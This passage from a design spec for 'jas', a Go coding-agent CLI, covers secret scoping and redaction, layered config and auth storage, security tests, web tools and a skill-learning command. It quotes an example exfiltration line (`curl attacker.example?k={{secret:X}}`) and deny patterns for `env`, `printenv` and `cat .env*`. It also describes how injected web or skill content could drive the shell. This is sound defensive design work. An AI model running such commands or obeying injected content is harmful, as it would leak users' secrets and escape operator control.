3. **Blind secret access (v2):** scenario can declare secrets with a scope:
   ```yaml
   secrets:
     - {name: OPENROUTER_KEY, tools: [web_fetch], hosts: [openrouter.ai]}
   ```
   jas loads them from the environment into its own memory; tools reference
   them as `{{secret:NAME}}` placeholders resolved at execution time *inside*
   jas — the value never round-trips through the model. A placeholder is only
   resolved for the listed tools and, for network tools, only for requests to
   the listed hosts; `shell` never resolves placeholders. This blocks
   `curl attacker.example?k={{secret:X}}` exfiltration after a prompt
   injection (e.g. from `web_fetch` content). Exact-value redaction (layer 2)
   catches any value that is echoed back anyway.
4. **Session hygiene:** `events.jsonl` and the model transcript pass through the
   same redaction gate, so crash-resume replays only already-redacted events.

Also denied at the **shell** layer as a best-effort filter: `env`, `printenv`,
`cat .env*` style commands are matched against the same deny semantics (the
shell tool inspects the command string for deny-pattern hits before exec).
**Not a security boundary** — §3.1 / #1. Layer 2 (output redaction) is the
backstop; containers are the isolation answer.

**Acceptance test for v1:** a fixture repo (no scenario) with a `.env` present,
and `JAS_API_KEY` set; agent is asked "print the config" and "print your
environment"; transcript and `events.jsonl` must contain zero secret values
(CI assertion).

## 10. Settings & storage (Claude-style layers + `~/.jas/`)

jas needs a persistent home. Env vars alone can't express saved keys,
per-model overrides, or defaults you set once and forget. Modeled on pi's agent
dir (verified against a local `~/.pi/agent/` install): one settings dir, keys
kept apart from config, and **everything configurable from the CLI and
stored**. pi writes `defaultProvider`/`defaultModel` to `settings.json` when
you pick a model and saves keys to `auth.json` on `/login`. Env vars are only a
fallback there. jas does the same from v1 with plain subcommands and chat `/settings`.

```
~/.jas/                        # agent dir (global-only for auth/trust/sessions)
├── config.json                # global prefs: model/provider/base_url, approve, UI, …
├── models.json                # (v2) named OpenAI-compatible endpoints — NO raw keys
├── auth.json                  # saved API keys (chmod 0600; global-only forever)
├── trust.json                 # project trust answers (global-only forever)
├── scenarios/                 # saved scenario presets (not blueprints — #9)
├── sessions/                  # session dirs: <session>/events.jsonl (§3)
├── farms/                     # farm state (farm spec)
├── run/                       # supervisor sockets for attach
└── AGENTS.md                  # global instructions appended to every system prompt

<project>/.jas/
├── config.json                # shared team prefs (commit) — Claude-style project settings
├── config.local.json          # personal prefs (gitignore) — overrides project
├── scenario.yaml              # runtime policy only: tools/hooks/sandbox/MCP (§8) — NOT prefs
├── hooks/                     # project hook scripts
├── sessions/                  # session-awareness records (git-excluded; proposed)
└── worktrees/                 # farm worktrees (git-excluded)

<project>/AGENTS.md            # loaded in v1 (#8); complements scenario.yaml
```

**Prefs resolution** (Claude 3-way; shipped):

```
CLI flag > JAS_* env vars > <project>/.jas/config.local.json
         > <project>/.jas/config.json > ~/.jas/config.json > built-in defaults
```

`jas config list` and chat `/settings` label each value with its source
(`flag`, `env JAS_*`, `local config`, `project config`, `global config`,
`default`). CLI `jas config set|unset` defaults to **global** for compat;
`/settings` defaults to **local**. Scope flags: `--global|--project|--local`.

**Scenario / policy resolution** (§8.1; later) stays separate from prefs.
Maps merge key-by-key; lists use pi's `+name`/`-name` add/remove semantics.
Do **not** dump prefs into `scenario.yaml`.

Per-model overrides live in each config layer under `models`. `models.json`
(named custom endpoints, each with its own key) arrives in v2.

**First-run experience** (v1; also `jas config init` to rerun it):

```sh
$ jas            # no config → interactive onboarding
Provider?        # openrouter | ollama | custom endpoint (→ base_url in config.json)
API key:         # read without echo → auth.json (0600), or "$OPENROUTER_API_KEY" ref
Default model:   # anthropic/claude-sonnet-4.6 → config.json
```

**Configure from the CLI** (v1). Every setting can be set, read and cleared
without editing JSON, and every stored value can be overridden for one run:

```sh
jas config set model anthropic/claude-sonnet-4.6   # → ~/.jas/config.json (default write)
jas config set --project approve shell             # → <root>/.jas/config.json
jas config set --local max_turns 80                # → <root>/.jas/config.local.json
jas config set base_url https://openrouter.ai/api/v1
jas config set models.my-local.context_window 32768
jas config get model                               # effective
jas config get --project approve                   # stored in that layer
jas config unset --local max_turns
jas config list          # effective value of every key, and where it came from:
                         #   model  anthropic/claude-sonnet-4.6  (global config)
                         #   approve  shell                      (project config)
                         #   max_turns  80                       (local config)

jas auth add openrouter                 # prompts for the key, no echo → auth.json
jas auth add openrouter --env OPENROUTER_API_KEY   # store a reference, not the key
jas auth list                           # names + source only, never values
jas auth rm openrouter | jas auth rotate openrouter

jas run --model z-ai/glm-5.3 --provider openrouter "…"   # one-run override

jas                       # inline chat in this project (first run: onboarding, then the chat)
jas --continue            # resume this project's newest session in the chat
jas --model z-ai/glm-5.3  # the same setting flags as jas run, plus --trust-project
```

`jas` with no subcommand opens the inline chat; it needs a terminal on stdin
and stdout, so scripts use `jas run "task"`, which is unchanged. A task
argument to bare `jas` is a usage error pointing at `jas run`. The trust
prompt for the project context file and project skills is asked before the
chat starts. Chat sessions use the same `~/.jas/sessions/<id>/events.jsonl`
layout and `session_started` payload as `jas run`.

Settings keys (v1): `provider`, `model`, `base_url`, `approve`, `max_turns`,
`max_tool_output`, `elide_at`, `keep_tool_results`, `redact_skip_paths`
(the per-path redaction opt-out, §9), the chat's compaction keys
`compact_reserve_tokens` (default 16384), `compact_keep_tokens` (default
20000) and `compact_model` (default: the session's model), `max_output_tokens`
(default 16000, sent as `max_tokens` on every request), and per-model
`models.<name>.context_window`. Each key `k` has a matching `JAS_<K>` env var
and, for the per-run ones, a `--<k>` flag. There is deliberately **no
`--api-key` flag**: argv shows up in shell history and `ps`. Keys come from
`auth.json`, an `$ENV` reference, or `JAS_API_KEY`.

**Key management rules:**

- `auth.json` stores either a literal key (chmod 0600, `JAS_NO_PLAINTEXT_KEYS=1`
  refuses to write it) or a `$ENV_NAME` reference resolved at launch — so the
  key can live in a password manager/env instead of on disk.
- Keys NEVER appear in config.json, models.json, or scenario files (§9's blind
  secret access consumes them by name only).
- `jas auth` subcommand: list/add/remove/rotate keys; never echoes values.
- Per-endpoint key resolution: `models.json` entry → `auth.json` name → env var.

**What env vars still do:** transient overrides just below CLI flags
(`JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` beat project and global config).
They are for CI and containers, where there is no `~/.jas/` to configure.
Persistent config lives in `~/.jas/` and is managed with `jas config` /
`jas auth`.

**Session storage** stays simple: `~/.jas/sessions/<id>/events.jsonl` (§3) is
the whole story — no DB, replay = tail the file. Farm state (v2) lives in
`~/.jas/farms/<farm-id>/` (plan, supervisor log, board, manifest, one event
log per part); worktrees live in the repo's git-excluded `.jas/worktrees/`; see the farm spec.

## 11. Security acceptance: v1, and project trust

**v1:**

- **Secrets fixture test (from §9):** CI assertion, zero secret values in the
  transcript and event log when a `.env` is present and `JAS_API_KEY` is set.
- **Redaction middleware active in v1** — it's ~60 lines of regex and it is the
  backstop for every later tool that produces output. Its fixture corpus
  includes false-positive cases (`go.sum`, lockfiles) that must pass
  unredacted, plus a real-repo FP sample (#7). Edit of a redacted region
  returns the explicit error; per-path opt-out is tested.
- **Shell env allowlist and path confinement** (§3) covered by tests:
  `printenv` from the shell tool shows no `JAS_*` keys; `read ../outside` and a
  symlink pointing outside the project root are both refused.
- **Shell stance documented** (§3.1): YOLO + `--approve`; containers are the
  isolation answer. No claim that command-string deny is a boundary (#1).
- **Resume contract tests:** crash between `tool_started` fsync and
  `tool_result` does not re-exec; Ctrl-C yields cancelled tool results;
  process-group kill reaps grandchildren (#4); a crash mid-`write` leaves the
  old or the new file, never a torn one.
- **Trust gate tests (v1):** untrusted `AGENTS.md` is not loaded without a TTY
  unless `--trust-project` is passed; editing a trusted `AGENTS.md` asks again.
- **Approval tests:** each `--approve` level gates exactly its row in §3.1;
  a gated call with no TTY exits 5.

**v2 — project trust extended to scenarios:** the v1 gate (§3) also covers a
project `.jas/scenario.yaml` that declares hooks or MCP servers. The cache key
in `~/.jas/trust.json` becomes project path **plus a hash of the context files,
the scenario file and the hook scripts it names**, so a `git pull` that changes
any of them asks again. The hash does **not** cover what a hook calls in turn
(`make`, other scripts, binaries on `PATH`). This is a startup gate only, not a
security boundary (pi's model). It exists because scenarios carry executable
hooks.

**v2 — untrusted content raises the default gate.** When a scenario enables
`web_fetch` or `web_search`, fetched pages can carry prompt injection. Under a
`never` default, that injection could drive `shell`. So the default approve
level for such a session becomes `shell`, unless `never` was set explicitly by
flag or config.

## 12. Web access & learning (v2/v3)

### 12.1 Web access (pi's answer: core stays thin, an extension package adds it)

Verified from pi-mono source: pi's built-in tools are only
`read, bash, powershell, edit, write, grep, find, ls` — **no web search tool**.
pi's web access happens two ways: the model just runs `curl` via `bash`
(their CHANGELOG fixes "crash when bash outputs binary data (e.g. `curl`
downloading a video file)"), or an extension package —
**pi-web-access** (`pi install npm:pi-web-access`, v0.45.0) provides
search/fetch as a first-class extension.

**What pi-web-access teaches us** (verified from its npm README):

- 4 capabilities: web_search, web_fetch (extract), GitHub cloning, and
  PDF/video understanding (YouTube transcripts + frame extraction)
- ~25 search providers behind one config; keys live in `~/.pi/agent/`
  web-search settings, never in the agent dir
- **Fallback chains** — SearXNG (private) first → subscription-backed OpenAI
  search → Exa (zero-config) → Brave → Tavily → … the keyless providers sit
  in the middle so it works with no keys at all
- GitHub cloning is a **separate capability**, not hidden inside fetch
- The tools also run as a **standalone MCP server** for other agents
- Fetching remote-hosted providers requires explicit opt-in
  (`fetchRouting.allowRemoteHostedProviders`) — privacy posture by default

jas adopts the same philosophy, formalized (see #11):

- **v1:** nothing. The shell tool gives curl for free.
- **v2 (shipped, opt-in):** in-tree Go tools, enabled only when
  `web_tools=true` in layered settings (default off). Chat and `jas run`
  register them via `tools.SessionTools`. When enabled and `approve` is still
  the built-in default, the session approve level rises to `shell` unless the
  user set `never` explicitly (§11).
  - `web_fetch <url>` — **pure** HTTP GET → HTML stripped to plain text
    (pure Go, `x/net/html`). Size/timeout capped. No cloning, no side effects
    beyond the GET. Kind = ReadOnly.
  - `web_search <query>` — pluggable `Searcher` chain. If `search_base_url` is
    set, SearXNG JSON is tried first; otherwise DuckDuckGo lite (keyless HTML).
    Brave/Tavily and paid `apiKeyEnv` providers are deferred.
  - `git_clone <url> [dest]` — **deferred**. Explicit shallow clone,
    path-confined to the session dir; not a special case of `web_fetch`.
- Provider chain today: SearXNG (when `search_base_url` set) → DuckDuckGo.
  Future: configurable `search.providers` list with paid backends.
- Search providers are a tiny interface, not a dependency:
  `Search(ctx, q, limit) []Result`.
- Redaction middleware (§9) applies to tool output → web content is scrubbed
  like any other tool result before it enters the transcript.
- PDF/video understanding is **v3+** (remote servers need API keys); v2 keeps
  to fetch + search (+ clone later).

### 12.2 `jas learn <topic>` — research → skill

The user story: "jas, learn X and remember it for next time." Runs as a normal
agent session with a scenario that gives it: web_search + web_fetch + skill_write.

```
jas learn "how to write a uv venv workflow"      # interactive
jas learn --auto "topic"                         # non-interactive → pending queue
```

Flow: agent researches (§12.1 tools) → drafts `SKILL.md` + `references/` per the
agentskills.io spec (same as pi, so skills interop across Claude Code/Hermes)
→ shows the draft for approval → saves to `~/.agents/skills/<name>/` or project
`.agents/skills/<name>/` (the directories jas already scans; `~/.jas/**` is in
the deny floor, so tools could not read skills kept there). The skill is then advertised to future sessions
(name + description only; full instructions load on demand — pi's model).

Guardrails:

- A skill is instructions injected into **every future session**. A skill
  drafted from web content is therefore a persistent prompt-injection channel.
  `--auto` never installs. It writes drafts to `~/.jas/skills-pending/<name>/`,
  which are never advertised. `jas skills review` shows the draft and its
  source URLs; `jas skills approve <name>` installs it.
- `learn` never overwrites an existing skill without `--force`.
- `jas skills list` shows what's installed (and pending); `jas skills rm <name>`.

## 13. Risks

- **API compat drift** — pin to chat-completions + SSE via a provider-neutral
  message/event layer (#5); Anthropic-style deltas stay inside the adapter.
  Test against OpenRouter AND ollama. Retry/backoff on 429/5xx; SSE idle timeout.
- **SSE delta reassembly** — tool-call chunks split across SSE events differ per
  provider (OpenAI vs Anthropic-style vs vLLM quirks); budget a full day for the
  accumulation logic and fuzz it against recorded streams.
- **Sandbox safety** — v1 shell is YOLO (§3.1 / #1); `--approve` is the gate;
  containers are the isolation answer. Document loudly; do not claim
  command-string deny is a boundary.
- **Scope creep** — farm/fullscreen TUI/blueprints are out of v1 (blueprints dropped entirely,
  #9). If v1 takes 3 weekends, it's a bad project, kill features not quality.
- **Context / cost runaway** — v1 tracks prompt tokens, elides old tool
  results in chunks, and clean-stops on `context_length_exceeded` (#2).
  Auto-compaction shipped (§5). Token and wall-clock caps for `jas run`
  (checked **before** each request, exit 7) are a farm prerequisite; farm adds
  a farm-wide total, an integrator reserve and a shared rate limiter (farm
  spec, Budgets). Usage is logged per request into events.jsonl from day one.
- **Deny-list gaps** — deny semantics are regex/path-glob based and will have
  blind spots (novel secret formats; shell commands that read files indirectly,
  e.g. `python -c`). Symlinks are handled by resolving paths before matching
  (§3). Mitigation: the redaction middleware is the backstop, containers are
  the isolation answer, and the fixture-corpus + real-repo FP tests run on
  every release (#7).

## 14. jas vs pi

pi (`badlogic/pi-mono`) is the closest peer and the main reference for this
design. The full feature audit is in
[research/pi-mono-audit.md](research/pi-mono-audit.md). A broader Oct 2026 market comparison (15 products, design review, recommendations) is in [research/market-comparison-2026-10.md](research/market-comparison-2026-10.md). This table compares
the parts a user sees, as planned for jas v1 and v2, against a local pi install
(`~/.pi/agent/`, pi 1.4).

| Area | pi | jas | Why jas differs |
|---|---|---|---|
| Runtime | Node/TypeScript | single static Go binary | no runtime to install; goroutines fit the farm |
| Config storage | `~/.pi/agent/settings.json` (`defaultProvider`, `defaultModel`, packages) | `~/.jas/config.json` | same model |
| Setting config | TUI: `/model` saves the default, `pi config` toggles resources | `jas config set/get/unset/list`, first-run onboarding; `/model` picker Ctrl+S stores the default | config is scriptable, no TUI needed; the inline picker adds the shortcut |
| Keys | `auth.json` via `/login` (incl. OAuth); env vars as fallback; `--api-key` flag | `auth.json` (0600) or `$ENV` reference via `jas auth`; `JAS_API_KEY` fallback; **no `--api-key` flag** | argv leaks to shell history and `ps` |
| Model catalog | `models-store.json` with context window, costs, thinking levels | compiled-in catalog + `models.<name>.context_window` override (v1); `models.json` (v2) | needed for the v1 context budget |
| Override order | CLI flag > settings > env fallback | CLI flag > `JAS_*` > local > project > global > defaults | env sits above stored config so CI can override without touching `~/.jas/` |
| Modes | text, `--mode json`, `--mode rpc` | `jas run`, `--json` (v1); RPC over stdio + Unix socket (v2) | the socket enables `attach` from another terminal |
| Tool approval | none built in (YOLO; gating via extensions) | `--approve=never\|shell\|mutating` ladder, exit 5 without a TTY | gate exists in core so CI can rely on it |
| Project trust | `--approve`/`-a` trusts project-local files; `--no-context-files` | trust gate on `AGENTS.md`/`CLAUDE.md` (v1), extended to scenarios (v2); `--trust-project` | note the flag clash: pi's `--approve` means *trust*, jas's means *tool gating* |
| Context | auto-compaction (summary at `window − reserve`) | v1: chunked tool-result elision + clean stop; v2: same compaction | elision is the cheap v1 floor |
| Sessions | JSONL tree, `--continue` / `--resume` / `--fork` | versioned JSONL events with `parent_id`; resume and fork in v2 | write-ahead `tool_started` for at-most-once side effects |
| Parallelism | one session per process (tmux for more) | session awareness across parallel sessions; then `jas farm`: one task split into parts, worktree per part, integrator, supervisor-run `check` | last in bet order, after its prerequisites |
| Extensibility | TS extensions, npm/git packages, skills, prompt templates, MCP | `Tool` interface, MCP (v2), hooks + scenarios (v2), `SKILL.md` skills | no plugin ABI in Go; scenarios are data |
| Secrets | `auth.json`, keys out of settings | four layers (§9): deny floor, output redaction, blind access (v2), redacted log | redaction is the backstop for YOLO shell |
